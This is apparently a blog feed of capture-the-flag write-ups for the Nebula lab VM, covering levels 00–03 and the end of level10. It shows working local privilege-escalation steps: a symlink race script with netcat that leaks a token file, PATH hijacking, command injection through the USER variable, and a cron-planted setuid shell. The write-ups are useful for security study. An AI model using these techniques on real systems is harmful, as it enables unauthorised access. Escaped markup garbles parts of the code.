</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">You</span> <span class="n">don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">have</span> <span class="n">access</span> <span class="n">to</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>What to do is immediately clear, there is a race condition in the code, after
we call access() to some file, it could be different file with the same name,
which we are trying to open.</p>

<p>From the man 2 access:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Warning:  Using access() to check if a user is authorized to, for example, open
</span><span class='line'>a file before actually doing so using open(2) creates a security hole, because
</span><span class='line'>the user might exploit the short time interval between checking and opening the
</span><span class='line'>file to manipulate it.  For this reason, the use of this system call should be
</span><span class='line'>avoided.</span></code></pre></td></tr></table></div></figure></p>

<p>So /home/flag10/flag10 binary sends arbitrary file with access() permission to
some host, port 18211.</p>

<p>We can test it in two screens using:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ nc -l 18211&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ /home/flag10/flag10 /etc/passwd 0</span></code></pre></td></tr></table></div></figure></p>

<p>Our exploit:
<figure class='code'><figcaption><span>mklink.sh </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/usr/bin/env bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;run_netcat<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> nc -l 18211<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;make_symlinks<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> rm /tmp/token 2&gt;/dev/null<span class="p">;</span> touch /tmp/token<span class="p">;</span> ln -sf /home/flag10/token /tmp/token<span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;run_flag<span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span> /home/flag10/flag10 /tmp/token <span class="m">0</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span>amp<span class="p">;</span><span class="m">1</span> <span class="p">;</span> <span class="k">done</span>
</span><span class='line'><span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;run_netcat <span class="p">&amp;</span>amp<span class="p">;</span>
</span><span class='line'>make_symlinks <span class="p">&amp;</span>amp<span class="p">;</span>
</span><span class='line'>run_flag <span class="p">&amp;</span>amp<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;sleep 0.05
</span><span class='line'>pkill -P <span class="nv">$$</span> <span class="c"># Kill all children</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">sh-4.2$</span> ./mklink.sh
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">.oO Oo.</span>
</span><span class='line'><span class="go">615a2ce1-b2b5-4c76-8eed-8aa5c4015c27</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31349 Terminated              run_netcat</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31350 Terminated              make_symlinks</span>
</span><span class='line'><span class="go">./mklink.sh: line 20: 31351 Terminated              run_flag&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ su flag10</span>
</span><span class='line'><span class="go">Password:&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ id</span>
</span><span class='line'><span class="go">uid=989(flag10) gid=989(flag10) groups=989(flag10)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ getflag</span>
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (00-05)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/16/exploit-exercises-nebula-00-05/"/>
    <updated>2015-06-16T19:04:18+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/16/exploit-exercises-nebula-00-05</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<p>Because it was not possible to log in via ssh, we generated the host key:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key</span></code></pre></td></tr></table></div></figure></p>

<h2>Level00</h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> find / <span class="o">(</span> -perm -4000 <span class="o">)</span> 2&gt;/dev/null
</span><span class='line'><span class="go">/bin/&amp;hellip;/flag00</span>
</span><span class='line'><span class="go">/bin/fusermount</span>
</span><span class='line'><span class="go">/bin/mount</span>
</span><span class='line'><span class="go">/bin/ping</span>
</span><span class='line'><span class="go">/bin/ping6</span>
</span><span class='line'><span class="go">/bin/su</span>
</span><span class='line'><span class="go">[ .. SNIP .. ]</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We found a suspicious file on the first line, after executing, we obtained flag.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level00@nebula:~$</span> id
</span><span class='line'><span class="go">uid=1001(level00) gid=1001(level00) groups=1001(level00)</span>
</span><span class='line'><span class="gp">level00@nebula:~$</span> /bin/<span class="p">&amp;</span>hellip<span class="p">;</span>/flag00
</span><span class='line'><span class="go">Congrats, now run getflag to get your flag!</span>
</span><span class='line'><span class="gp">flag00@nebula:~$</span> id
</span><span class='line'><span class="go">uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)</span>
</span><span class='line'><span class="gp">flag00@nebula:~$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level01</h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">system</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">echo</span> <span class="n">and</span> <span class="n">now</span> <span class="n">what</span><span class="o">?&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Solution:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span> <span class="nb">echo</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>sh<span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; <span class="nb">echo</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span><span class="nb"> </span>chmod +x ./echo
</span><span class='line'><span class="gp">level01@nebula:~$</span> id
</span><span class='line'><span class="go">uid=1002(level01) gid=1002(level01) groups=1002(level01)</span>
</span><span class='line'><span class="gp">level01@nebula:~$</span> /home/flag01/flag01
</span><span class='line'><span class="gp">sh-4.2$</span> id
</span><span class='line'><span class="go">uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)</span>
</span><span class='line'><span class="gp">sh-4.2$</span> getflag
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level02</h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span> <span class="o">%</span><span class="n">s</span> <span class="n">is</span> <span class="n">cool</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">getenv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">USER</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;));</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">about</span> <span class="n">to</span> <span class="n">call</span> <span class="n">system</span><span class="p">(</span><span class="err">\</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Solution:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level02@nebula:~$</span> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="p">&amp;</span>lsquo<span class="p">;;</span>sh<span class="p">;&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="gp">level02@nebula:~$</span> /home/flag02/flag02
</span><span class='line'><span class="go">about to call system(&amp;ldquo;/bin/echo ;sh; is cool&amp;rdquo;)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ getflag</span>
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level03</h2>

<p>There is a crontab entry that is called every couple of minutes.</p>

<p>Because the /tmp is mounted with nosuid option, we use home directory to store suid binary:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level03@nebula:~$</span> mount <span class="p">|</span> grep nosuid
</span><span class='line'><span class="go">proc on /proc type proc (rw,noexec,nosuid,nodev)</span>
</span><span class='line'><span class="go">sysfs on /sys type sysfs (rw,noexec,nosuid,nodev)</span>
</span><span class='line'><span class="go">devpts on /dev/pts type devpts (rw,noexec,nosuid,gid=5,mode=0620)</span>
</span><span class='line'><span class="go">tmpfs on /run type tmpfs (rw,noexec,nosuid,size=10%,mode=0755)</span>
</span><span class='line'><span class="go">tmpfs on /tmp type tmpfs (rw,nosuid,nodev)</span>
</span><span class='line'><span class="go">none on /run/lock type tmpfs (rw,noexec,nosuid,nodev,size=5242880)</span>
</span><span class='line'><span class="go">none on /run/shm type tmpfs (rw,nosuid,nodev)</span>
</span><span class='line'><span class="go">vmware-vmblock on /run/vmblock-fuse type fuse.vmware-vmblock (rw,nosuid,nodev,default_permissions,allow_other)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The file invoked by cron is here:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:/home/flag03<span class="nv">$ </span>cat writable.sh&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/sh&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;for i in /home/flag03/writable.d/* <span class="p">;</span> <span class="k">do</span>
</span><span class='line'>    <span class="o">(</span><span class="nb">ulimit</span> -t 5<span class="p">;</span> bash -x <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$i</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'>    rm -f <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$i</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Our code to obtain suid shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level03@nebula:~<span class="nv">$ </span><span class="nb">cd</span> /home/flag03/writable.d/&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;level03@nebula:/home/flag03/writable.d<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="c">#include &amp;lt;stdio.h&gt;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>stdlib.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>sys/types.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>unistd.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>   setreuid<span class="o">(</span>geteuid<span class="o">()</span>,geteuid<span class="o">())</span><span class="p">;</span>
</span><span class='line'>   execve<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/sh<span class="p">&amp;</span>rdquo<span class="p">;</span>, NULL, NULL<span class="o">)</span><span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   <span class="k">return</span> 0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'><span class="p">&amp;</span>lsquo<span class="p">;</span> &gt; /tmp/run.c&lt;/p&gt;
</span><span class='line'>
